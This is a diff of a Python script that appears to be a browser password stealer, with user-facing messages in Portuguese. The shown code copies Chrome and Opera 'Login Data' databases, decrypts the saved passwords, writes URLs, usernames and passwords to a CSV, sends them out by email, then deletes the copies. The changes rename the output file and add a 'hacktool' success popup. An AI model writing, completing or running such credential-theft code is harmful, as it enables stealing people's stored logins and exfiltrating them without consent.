@@ -26,6 +26,7 @@ if __name__ == '__main__':
         from_password=FROM_PASSWORD,
         to_email=TO_EMAIL,
         )
+    
     text = f'{"-"*7} readme.txt {"-"*7}\n\n \t LET ME \n\n{"-"*26}'
     FOLDER = 'README'
     if not os.path.exists(FOLDER):
@@ -50,9 +51,9 @@ if __name__ == '__main__':
         encrypted_password = item[2]
         decrypted_password = vb.decryptPassword(encrypted_password, key_master)
         save = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n\n"
-        with open('iloveyou.csv', 'a') as passwords:
+        with open('fuckyou.csv', 'a') as passwords:
             passwords.write(save)
-
+            
     # opera    
     try:
         key = vb.getEncryptionKey()
@@ -60,7 +61,7 @@ if __name__ == '__main__':
             db_path = os.path.join(os.environ["userprofile"],"AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
         except:
             db_path = os.path.join(os.environ["userprofile"],"AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
-        file = open("iloveyou.csv", "a")
+        file = open("fuckyou.csv", "a")
         file.write("\n\n============> NAVEGADOR OPERA <============\n")
         shutil.copyfile(db_path, operadb)
         db = sqlite3.connect(operadb)
@@ -95,10 +96,13 @@ if __name__ == '__main__':
     vb.Send_Email()
     cursor.close()
     connect.close()
+    
+messagebox.showinfo(title='hacktool', message='Executado com Sucesso!')
+
 try:
     if os.path.exists(chromedb):
         os.remove(chromedb)
     if os.path.exists(operadb):
         os.remove(operadb)
-    os.remove('iloveyou.csv')
+    os.remove('fuckyou.csv')
 except: ...
